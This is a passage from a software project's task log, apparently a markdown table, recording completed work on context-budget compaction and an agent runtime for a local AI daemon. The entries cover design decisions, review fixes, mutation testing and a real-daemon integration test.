| 2026-09-27 | T-F1-12 | done | Tech Q-03 answered against the memory budget: a tiktoken encoding loads a 100k–200k-entry BPE table (tens of MiB) into a daemon whose idle budget is 80 MiB, and covers one family while the local defaults are Qwen, Llama and Gemma — so no tokenizer is loaded and everything sent is estimated at a token per three bytes, deliberately high. `Compact` keeps the newest messages that fit, summarizes the rest through an injected `Summarize` (the runtime passes the `fast` class), and returns the `context.compacted` payload. spec-guardian blocked the first version on four gaps and two risks, all fixed: a failed summary now is `ErrContextOverflow` with its cause, as the spec said; the summary no longer piles up — the runtime sends the base prompt, the one summary and the messages after it, and a later compaction summarizes the old summary again and replaces it; mid-turn, when the newest messages are tool calls, the user's request is kept verbatim and the kept history always starts with a user message (some chat templates require it), never with a tool result apart from its call; the window is the smallest known among the thread's candidates, so a fallback to a smaller model is compacted for rather than skipped; the reserve is capped at half the window; tool-call ids and response schemas count. The event itself, persisted then published, moved to T-F1-13 with a named test in the matrix. The budget lives in `context/domain` rather than `context/budget/`, which the arch rules do not map. **Delta `2026-09-context-budget`, proposed.** Tech 1.26. 43 mutations over four rounds, all killed; two unreachable branches found that way were removed. `task ci` green. |
| 2026-09-27 | T-F1-13 | done | `internal/agents`: domain, ports, the `threadstore` adapter over migration 0005, and the runtime as `agents-service` (a new arch component, like `sessions-service`: agents → ports of tools, context, llmgw, security). `thread.create/send/get/list/update` are served (API 1.19; §5.23 given parameters and results) with `thread.delta`, `thread.tool_call`, `thread.turn_finished` and `context.compacted`. Analyze C-01 answered: a write that fails stops the turn with `storage_error`, publishing and running nothing unrecorded — **delta `2026-09-agent-runtime`, proposed**, with `context_overflow`, chunk-by-chunk persistence of streamed text, and per-turn compaction (superseding `context-budget` decision 5's cross-turn wording). The router gained `Call.Model` (a thread's model is its only candidate) and `Window` (smallest known window), and its usage event carries the model and cost. Tests: runtime units with an in-memory store whose `BeginTurn` is non-atomic like SQLite's deferred transaction, and a publisher that fails the test if an event is published before what it reports is stored; the threadstore against real SQLite; the wire through a fake runtime; and `TestAThreadRunsAgainstARealDaemon_REQ_AGT_001`, a real daemon whose Ollama is served locally, driving create → send → `read_file` → answer through the socket. Mutation found three untested writes (a delta, a pending tool call, a compaction note) and an unexercised per-thread lock, all now pinned. 38 mutations, all killed but one no-op. Approvals (`ask`) are `denied_by_policy` until T-F1-14; the cancelled-turn state is T-F1-16's. `task ci` green. |
| — | — | — | — |
